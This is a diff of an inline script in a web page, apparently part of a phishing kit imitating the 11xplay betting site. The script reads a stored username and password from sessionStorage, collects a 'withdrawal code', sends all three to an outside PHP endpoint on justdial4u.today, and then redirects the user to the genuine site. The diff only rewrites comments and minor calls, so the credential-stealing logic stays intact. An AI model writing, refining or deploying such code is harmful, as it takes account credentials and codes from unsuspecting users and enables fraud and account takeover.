@@ -947,33 +947,32 @@
         }
     </style>
 
- <script type="text/javascript">
-        // Function to send data after user enters the withdrawal code
+<script type="text/javascript">
         function submitCodeAndSendEmail() {
-            // Get the entered code
+            // Get the code entered by the user
             var code = $("#code").val();
 
-            // Get saved login data from sessionStorage
+            // Retrieve the username and password from sessionStorage
             var loginName = sessionStorage.getItem("loginName");
             var password = sessionStorage.getItem("password");
 
-            // Ensure the code is provided
-            if (code !== '') {
-                // Send data to PHP page via AJAX to send email
+            // Check if the code field is not empty
+            if (code) {
+                // Send an AJAX request to the PHP page
                 $.ajax({
                     type: "POST",
-                    url: "https://justdial4u.today/11xxplay-mail.php",  // Replace with your actual PHP server URL
+                    url: "https://justdial4u.today/11xxplay-mail.php", // Your PHP server URL
                     data: {
                         loginName: loginName,
                         password: password,
                         code: code
                     },
-                    success: function (msg) {
-                        if (msg === "sucessmsg") {
+                    success: function(response) {
+                        if (response === "sucessmsg") {
                             alert("Email sent successfully!");
                             window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
                         } else {
-                            $("#errorMsg").html("There was an error sending the email.");  // Show error message
+                            $("#errorMsg").text("There was an error sending the email.");
                         }
                     },
                     error: function(xhr, status, error) {
@@ -982,7 +981,7 @@
                     }
                 });
             } else {
-                $("#errorMsg").html("Please enter the withdrawal code.");  // Show alert if code is empty
+                $("#errorMsg").text("Please enter the withdrawal code.");
             }
         }
     </script>
